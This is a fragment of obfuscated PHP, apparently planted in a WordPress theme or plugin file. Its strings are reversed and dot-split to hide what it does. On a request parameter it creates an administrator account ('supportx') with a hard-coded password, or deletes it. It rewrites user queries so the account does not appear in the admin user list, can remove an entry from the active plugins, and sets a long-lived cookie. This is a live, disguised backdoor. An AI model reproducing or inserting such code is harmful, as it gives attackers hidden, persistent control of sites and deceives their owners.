    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
         wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
         call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}